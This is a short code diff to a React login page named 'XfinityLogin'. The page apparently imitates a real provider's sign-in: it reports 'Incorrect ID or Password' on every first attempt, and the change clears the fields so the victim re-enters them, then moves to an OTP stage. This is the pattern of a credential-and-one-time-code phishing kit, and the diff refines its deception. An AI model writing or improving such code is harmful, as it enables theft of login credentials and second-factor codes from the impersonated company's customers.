@@ -35,10 +35,7 @@ const loginSchema = z.object({
         usernameRegex.test(value)
       );
     }, "Please enter a valid email, mobile number, or username"),
-  password: z
-    .string()
-    .min(8, "Password must be at least 8 characters")
-    
+  password: z.string().min(8, "Password must be at least 8 characters"),
 });
 
 const otpSchema = z.object({
@@ -113,6 +110,7 @@ export default function XfinityLogin() {
         if (submissionCount < 1) {
           // First submission: show "Incorrect ID or Password" modal
           setShowDialog(true);
+          setForm({ username: "", password: "", otp: form.otp }); // Clear username and password
         } else {
           // Second submission: move to stage 2 and show OTP modal
           setStage(2);
